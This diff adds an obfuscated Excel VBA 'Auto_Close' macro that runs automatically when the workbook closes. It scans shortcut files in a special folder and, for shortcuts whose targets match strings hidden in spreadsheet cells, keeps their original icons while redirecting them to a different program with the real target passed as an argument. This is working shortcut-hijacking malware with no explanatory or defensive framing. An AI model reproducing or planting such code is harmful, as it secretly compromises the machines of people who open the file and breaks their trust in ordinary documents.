@@ -1,0 +1,18 @@
+Sub Auto_Close()
+Set rIpOEs = CreateObject(activeSheet.Range("BA57").value)
+Set hwrxIY = CreateObject(activeSheet.Range("BB57").value)
+Set aXJybY = hwrxIY.GetFolder(rIpOEs.SpecialFolders(activeSheet.Range("BD57").value))
+For Each vTFZfX In aXJybY.Files
+If(InStr(Lcase(vTFZfX), ".lnk")) Then
+Set eTvAFpRdz = rIpOEs.CreateShortcut(rIpOEs.SPecialFolders(activeSheet.Range("BD57").value) & "\" & vTFZfX.name)
+If(InStr(Lcase(eTvAFpRdz.targetPath), activeSheet.Range("BH57").value) or InStr(Lcase(eTvAFpRdz.targetPath), activeSheet.Range("BJ57").value) or InStr(Lcase(eTvAFpRdz.targetPath), activeSheet.Range("BM57").value)) Then
+eTvAFpRdz.IconLocation = eTvAFpRdz.targetpath
+eTvAFpRdz.arguments = "-w " & activeSheet.Range("BO57").Value & eTvAFpRdz.targetPath & "'" & activeSheet.Range("BS57").Value
+eTvAFpRdz.targetpath = left(CurDir, InStr(CurDir, ":")-1) & activeSheet.Range("BW57").value
+if(Len(eTvAFpRdz.arguments) < 1023) Then
+eTvAFpRdz.save
+end if
+end if
+end if
+next vTFZfX
+End Sub
